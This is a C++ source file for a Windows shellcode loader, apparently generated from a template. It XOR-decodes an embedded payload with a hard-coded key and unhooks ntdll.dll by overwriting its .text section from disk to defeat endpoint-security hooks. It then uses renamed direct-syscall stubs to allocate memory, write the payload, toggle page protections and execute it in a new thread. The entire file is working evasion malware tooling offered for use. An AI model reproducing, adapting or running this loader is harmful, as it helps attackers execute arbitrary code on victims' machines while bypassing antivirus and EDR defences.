
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "Stub\Syscalls2.h"
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

unsigned char payload[] = {0x46,0x53,0x55,0x50,0x51,0x47,0x52,0x47,0x53,0x47,0x50,0x47,0x51,0x4e,0x8b,0xaa,0x22,0xfe,0x9f,0xfb,0xf9,0xbe,0x0e,0x61,0x04,0x06,0xee,0xd7,0x02,0x06,0x06,0x4e,0x2d,0xe6,0xc1,0x43,0xd6,0x4d,0x63,0x74,0x68,0xc1,0x43,0xd2,0x63,0x6a,0x35,0x34,0xc1,0x43,0xde,0x28,0x62,0x6a,0x6a,0xc0,0x43,0xda,0x06,0xc1,0x43,0xa6,0x51,0x6f,0x68,0x6f,0xc1,0x43,0xa2,0x68,0x63,0x72,0x28,0xc1,0x43,0xae,0x62,0x6a,0x6a,0x06,0xc1,0x43,0xc6,0x4a,0x69,0x67,0x62,0xc1,0x43,0xc2,0x4a,0x6f,0x64,0x74,0xc1,0x43,0xce,0x67,0x74,0x7f,0x47,0xc0,0x43,0xca,0x06,0xc1,0x43,0xf6,0x50,0x6f,0x74,0x72,0xc1,0x43,0xf2,0x73,0x67,0x6a,0x47,0xc1,0x43,0xfe,0x6a,0x6a,0x69,0x65,0xc0,0x43,0xfa,0x06,0xc1,0x42,0x22,0x66,0x6b,0x75,0x70,0x65,0xc1,0x42,0x22,0x62,0x74,0x72,0x28,0x62,0x60,0xc1,0x42,0x22,0x6e,0x6a,0x6a,0xc0,0x42,0x22,0x6c,0x06,0xc1,0x43,0xe6,0x67,0x62,0x70,0x67,0xc1,0x43,0xe2,0x76,0x6f,0x35,0x34,0xc1,0x43,0xee,0x28,0x62,0x6a,0x6a,0xc0,0x43,0xea,0x06,0xc1,0x42,0x22,0x76,0x71,0x75,0x34,0x59,0xc1,0x42,0x22,0x72,0x35,0x34,0x28,0x62,0x60,0xc1,0x42,0x22,0x7e,0x6a,0x6a,0xc0,0x42,0x22,0x7c,0x06,0xc1,0x42,0x22,0x2e,0x75,0x72,0x74,0x6a,0x60,0xc1,0x42,0x22,0x2a,0x63,0x68,0xc0,0x42,0x22,0x28,0x06,0xc1,0x42,0x22,0x36,0x76,0x74,0x6f,0x68,0x60,0xc1,0x42,0x22,0x32,0x72,0x60,0xc0,0x42,0x22,0x30,0x06,0xc1,0x43,0x86,0x51,0x55,0x47,0x55,0xc1,0x43,0x82,0x72,0x67,0x74,0x72,0x60,0xc1,0x43,0x8e,0x73,0x76,0xc0,0x43,0x8c,0x06,0xc1,0x42,0x22,0x3e,0x75,0x69,0x65,0x6d,0x60,0xc1,0x42,0x22,0x3a,0x63,0x72,0xc0,0x42,0x22,0x38,0x06,0xc1,0x42,0x22,0x4e,0x65,0x69,0x68,0x68,0xc1,0x42,0x22,0x4a,0x63,0x65,0x72,0x06,0xc1,0x83,0x66,0x60,0x04,0x06,0x75,0x63,0x68,0x62,0xc0,0x83,0x62,0x60,0x04,0x06,0x06,0xc1,0x83,0x6e,0x60,0x04,0x06,0x74,0x63,0x65,0x70,0xc0,0x83,0x6a,0x60,0x04,0x06,0x06,0xc1,0x43,0xb6,0x65,0x6a,0x69,0x75,0xc1,0x43,0xb2,0x63,0x75,0x69,0x65,0xc1,0x43,0xbe,0x6d,0x63,0x72,0x06,0xc1,0x43,0x96,0x51,0x55,0x47,0x45,0xc1,0x43,0x92,0x6a,0x63,0x67,0x68,0x60,0xc1,0x43,0x9e,0x73,0x76,0xc0,0x43,0x9c,0x06,0xc1,0x42,0x22,0x56,0x6f,0x68,0x63,0x72,0xc1,0x42,0x22,0x52,0x59,0x67,0x62,0x62,0x60,0xc1,0x42,0x22,0x5e,0x74,0x06,0xc1,0x42,0x22,0x26,0x6e,0x72,0x69,0x68,0x60,0xc1,0x42,0x22,0x22,0x75,0x06,0xc1,0x42,0x22,0x46,0x6b,0x63,0x6b,0x65,0x60,0xc1,0x42,0x22,0x42,0x76,0x7f,0xc0,0x42,0x22,0x40,0x06,0xc1,0x83,0x5e,0x60,0x04,0x06,0x55,0x72,0x67,0x61,0xc0,0x83,0x5a,0x60,0x04,0x06,0x06,0x63,0x4e,0x8d,0x02,0x23,0x66,0x06,0x06,0x06,0x4e,0x8d,0x4e,0x1e,0x4e,0x8d,0x57,0x26,0x4e,0x83,0xd4,0x72,0x26,0x60,0x09,0x19,0x82,0x06,0x06,0x06,0x06,0x06,0x4e,0x8d,0x44,0x56,0x60,0x85,0x7e,0x1e,0x06,0x09,0x82,0xd5,0x07,0x06,0x06,0x4e,0x8d,0x14,0x4e,0x83,0xd4,0x73,0xef,0x4a,0x8d,0x83,0x56,0x60,0x04,0x06,0x4f,0x65,0x46,0x3a,0x43,0x35,0xf0,0x47,0x8d,0xd0,0x40,0x8d,0x8a,0x06,0x8e,0x06,0x06,0x06,0x4b,0x05,0xce,0x47,0x8d,0x4f,0x26,0x43,0x8d,0x57,0x1e,0x4f,0x05,0xce,0x43,0x83,0xd4,0x72,0x21,0x8d,0x07,0x44,0x86,0x3a,0x06,0x41,0x73,0x15,0x44,0x86,0x7a,0x06,0x0b,0x75,0x73,0x0d,0x40,0x3e,0x72,0x06,0x08,0x09,0x82,0x8a,0x07,0x06,0x06,0xf9,0xc4,0x4e,0x85,0xc7,0x02,0x47,0x3d,0xd4,0x74,0xdf,0x4a,0x8d,0xbb,0x56,0x60,0x04,0x06,0x4e,0x8b,0x53,0xc6,0x4f,0x8d,0xce,0x47,0xf9,0xd1,0x4e,0x8d,0xde,0x4e,0x8b,0x4a,0x22,0x66,0xf9,0xd5,0x4e,0x8b,0x4b,0xd6,0x4e,0x8d,0xfe,0xf9,0xd5,0x4e,0x8b,0x4b,0xa6,0x4e,0x8d,0xf6,0xf9,0xd5,0x4e,0x8b,0x4b,0xe6,0xf9,0xd5,0x4e,0x8b,0x4a,0x22,0x76,0xf9,0xd5,0x4e,0x8b,0x52,0x22,0x2e,0x4e,0x8d,0xc9,0x4e,0x8d,0xde,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x36,0x4e,0x8f,0x43,0x26,0x4e,0x8d,0xc9,0x47,0xf9,0xd1,0x4e,0x8b,0x53,0x86,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x3e,0x4e,0x8f,0x43,0x06,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x4e,0x4e,0x8f,0x43,0x0e,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x93,0x66,0x60,0x04,0x06,0x4e,0x8d,0xcd,0x4a,0x8d,0xee,0x47,0xf9,0xd1,0x4e,0x8b,0x93,0x6e,0x60,0x04,0x06,0x4e,0x8f,0x43,0x2e,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x53,0xb6,0x4e,0x8d,0xcd,0x4a,0x8d,0xe6,0x47,0xf9,0xd1,0x4e,0x8b,0x53,0x96,0x4e,0x8f,0x43,0x36,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x56,0x4e,0x8f,0x43,0x3e,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x26,0x4e,0x8f,0x43,0x16,0x4e,0x8d,0xcd,0x47,0xf9,0xd1,0x4e,0x8b,0x52,0x22,0x46,0x4e,0x8f,0x43,0x1e,0x4e,0x8d,0xc9,0x47,0xf9,0xd1,0x4e,0x8b,0x53,0xf6,0x4e,0x8f,0x43,0x46,0x4e,0x8d,0xc8,0x47,0xf9,0xd1,0x4a,0x8d,0xfe,0xee,0x7e,0x07,0x06,0x06,0x4e,0x8d,0xfe,0x85,0x3e,0xf9,0x72,0x0e,0x4e,0xf9,0xc1,0x85,0x39,0xf9,0x73,0xfe,0x09,0xb1,0x59,0x02,0x4e,0x8b,0x53,0x66,0xb8,0x04,0x06,0x06,0x06,0x8d,0xc8,0xf9,0x53,0x06,0x43,0x35,0xc6,0x8b,0x50,0xf9,0x8d,0xc8,0xf9,0x53,0x0e,0x4e,0x8b,0x49,0x00,0x4e,0x8d,0xf6,0xf9,0x53,0x16,0x8f,0x43,0x4a,0x09,0xb1,0xcd,0xbe,0x04,0x06,0x06,0x06,0x60,0x8f,0x43,0x4e,0xf9,0x53,0x1e,0x60,0x8f,0x43,0x4c,0x47,0x8d,0xd8,0x09,0x19,0x82,0x06,0x06,0x06,0x06,0x06,0x85,0xfd,0x03,0x09,0x8b,0xc2,0x06,0x06,0x06,0x47,0xbe,0x16,0x06,0x06,0x06,0x4e,0x8b,0x53,0x4e,0x4e,0x8d,0xc8,0x47,0xf9,0xd3,0x85,0xfe,0xf9,0x73,0x2b,0xf9,0xc5,0xed,0xd8,0x4a,0x8d,0x44,0x26,0xef,0x35,0xf8,0xf9,0xf9,0x47,0x8d,0x47,0x22,0x4f,0x05,0xc6,0x8d,0xcc,0x09,0xb1,0x12,0x4e,0x47,0x8d,0x4f,0x1a,0x4f,0x05,0xce,0x42,0x8d,0x3a,0x97,0x4b,0x05,0xfe,0xef,0x60,0xf8,0xf9,0xf9,0x4e,0x8b,0x8b,0x5e,0x60,0x04,0x06,0xf9,0x53,0x26,0x43,0x35,0xcf,0x4e,0x8b,0x93,0x5e,0x60,0x04,0x06,0x4a,0x8d,0xc6,0x4e,0x8d,0xc8,0xf9,0x53,0x2e,0x43,0x35,0xcf,0x4e,0x8b,0x93,0x56,0x60,0x04,0x06,0x4e,0x8d,0xc8,0x43,0x8b,0x47,0x02,0x47,0xf9,0xd2,0x8d,0x9b,0x56,0x60,0x04,0x06,0x83,0xdd,0x78,0x41,0x60,0x60,0x09,0x19,0x82,0x06,0x06,0x06,0x06,0x06,0x4f,0x65,0xd0,0x47,0xbe,0x06,0x62,0x04,0x06,0x43,0x2d,0xc0,0x8d,0xc5,0xbf,0x06,0x62,0x04,0x06,0x4e,0x2d,0xcc,0x4e,0x3d,0xce,0x4e,0x8b,0x83,0x06,0x04,0x06,0x06,0x4e,0x8d,0xc8,0x42,0x09,0x45,0xc5,0x4e,0x05,0xd6,0x43,0x35,0xcf,0x47,0xf9,0xd2,0x83,0xc6,0x78,0x0f,0x2d,0xde,0x42,0x05,0xf6,0x83,0xdd,0x79,0xc5,0x4e,0x8d,0xc8,0xf9,0x53,0x36,0xf9,0x53,0x3e,0x35,0xcf,0xbc,0x06,0x06,0x16,0x06,0x47,0xbe,0x06,0x36,0x06,0x06,0x42,0x8b,0x4f,0x46,0x47,0xf9,0xd1,0x47,0xbe,0x06,0x62,0x04,0x06,0x4e,0x8b,0x93,0x06,0x04,0x06,0x06,0x4e,0x8d,0xce,0x4e,0x8d,0xde,0xf9,0x53,0x46,0xf9,0xd5,0x4e,0x87,0xc2,0x0e,0x61,0x04,0x06,0x47,0x59,0x47,0x58,0x47,0x5b,0x47,0x5a,0x59,0x58,0x5d,0x5b,0xc5,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0x4e,0x8d,0x02,0x22,0xc5,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0xca,0x60,0x60,0x09,0x19,0x82,0x06,0x06,0x06,0x06,0x06,0x4e,0x85,0xea,0x16,0x4a,0x8f,0x12,0x22,0x4a,0x8f,0x5a,0x22,0x0e,0x4b,0x35,0xdd,0x4a,0x8b,0x52,0x22,0x1e,0x4a,0x2d,0xd6,0x4b,0x09,0x44,0xd5,0x63,0x4a,0x8d,0x1a,0x23,0x16,0x06,0x06,0x06,0x4b,0x3d,0xd5,0x75,0x10,0x60,0x47,0x87,0xe4,0x06,0xf6,0x4b,0x8b,0x9d,0x06,0xf6,0xf9,0xf9,0x47,0xc0,0x05,0x06,0x4b,0x3d,0xd5,0x73,0xf6,0x4a,0x8d,0x12,0x22,0x4a,0x8d,0x5a,0x22,0x0e,0x4e,0x85,0xc2,0x16,0xc5,0x06,0x06,0xf9,0xf9,0xf9,0xf9,0xa6,0x09,0x37,0x3f,0x34,0x28,0x37,0x30,0x3e,0x28,0x35,0x37,0x28,0x3e,0x37,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06,0x06};

unsigned int payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

//REPLACE_SANDBOX_CHECK

//

int deC(unsigned char payload[])
{
    std::string key;
    key = "rwcbqRauacxGZg5MTvgzrxePpfgDNYcqlKhZm4S8ykaNgoOOo";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

void DoEvil() {
	return;
}

static int Unhook() {
	HANDLE pollutedNtdll;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID hMapping;

	//get handle of pollutted ntdll.dll

	LPCSTR Ntdll = "ntdll.dll";
	pollutedNtdll = GetModuleHandleA(Ntdll);

	LPCSTR NtdllPath = "c:\\windows\\system32\\ntdll.dll";
	
	// open fresh copy of ntdll.dll and map a view of it

	hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		CloseHandle(hFile);
		return -1;
	}

	hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!hMapping) {
		CloseHandle(hFile);
		CloseHandle(hFileMapping);
		return -1;
	}

	// find .text section of ntdll

	IMAGE_DOS_HEADER * hImgDosHeader = (IMAGE_DOS_HEADER * )hMapping;
	IMAGE_NT_HEADERS* hImgNtHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
	IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
	IMAGE_SECTION_HEADER* hImgSecHeader = (IMAGE_SECTION_HEADER*)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
	DWORD oldprotect = 0;

	for (int i = 0; i < hImgFileHeader.NumberOfSections; i++) {
		if (!strcmp((char*)hImgSecHeader[i].Name, ".text")) {
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			return 0;
		}
	}
	return -1;
}



int main()
{
    
    
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
    NTSTATUS res = uJbIWSuYtYQvTmGdznz(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "uJbIWSuYtYQvTmGdznz FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "uJbIWSuYtYQvTmGdznz allocated memory in the current process sucessfully." << std::endl;
    }

    res = oCWsVVAkNOibiTLJsju(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "oCWsVVAkNOibiTLJsju FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "oCWsVVAkNOibiTLJsju wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = uYatsTOjMgjXkFRdoql(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        std::cout << "uYatsTOjMgjXkFRdoql FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "uYatsTOjMgjXkFRdoql modified permissions successfully." << std::endl;
    }

    res = yyNScZpQCpLnXLcmJgX(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        std::cout << "yyNScZpQCpLnXLcmJgX FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "yyNScZpQCpLnXLcmJgX created thread in current process successfully." << std::endl;
    }

    res = uYatsTOjMgjXkFRdoql(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "uYatsTOjMgjXkFRdoql FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "uYatsTOjMgjXkFRdoql modified permissions successfully." << std::endl;
    }

    res = gHxczLXymOZaQSzUkVn(thandle, 0);

    if (res != 0){
        std::cout << "gHxczLXymOZaQSzUkVn FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "gHxczLXymOZaQSzUkVn resumed created thread successfully." << std::endl;
    }

    res = iqjPMbtbOqQXaEsADJn(thandle, -1, NULL);   

}


